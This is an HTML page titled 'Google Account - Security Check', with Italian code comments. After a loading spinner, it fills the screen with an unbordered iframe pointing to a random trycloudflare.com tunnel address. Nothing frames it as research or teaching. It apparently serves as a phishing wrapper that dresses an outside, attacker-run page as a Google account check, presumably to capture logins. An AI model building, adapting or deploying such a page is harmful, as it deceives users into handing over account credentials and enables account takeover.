<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#121212">
    <title>Google Account - Security Check</title>
    <style>
        /* Reset totale */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* SFONDO UNIVOCO E CENTRAGGIO */
        body, html { 
            height: 100%; 
            width: 100%; 
            overflow: hidden; 
            background-color: #121212; 
            font-family: 'Roboto', Arial, sans-serif;
            /* Forza il contenuto al centro */
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* Il wrapper ora non è più absolute, così può essere centrato dal body */
        .iframe-wrapper {
            position: relative;
            width: 100%;
            height: 100%;
            /* Limita l'altezza se necessario, o lascialo al 100% per mobile */
            max-height: 100vh; 
            background-color: #121212;
            z-index: 2;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        iframe { 
            width: 100%; 
            height: 90%; /* Riducendo leggermente l'altezza dell'iframe rispetto al wrapper, lo stacchiamo dal bordo superiore */
            border: none; 
            display: block;
            background-color: transparent;
        }

        /* Caricamento centrato */
        .loader-container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            width: 100vw;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
            background-color: #121212;
        }

        .spinner {
            border: 3px solid #333;
            border-top: 3px solid #4285F4;
            border-radius: 50%;
            width: 28px;
            height: 28px;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="loader-container">
        <div class="spinner"></div>
    </div>

    <div class="iframe-wrapper">
        <iframe src="https://pregnancy-effective-federal-consultation.trycloudflare.com"></iframe>
    </div>

</body>
</html>
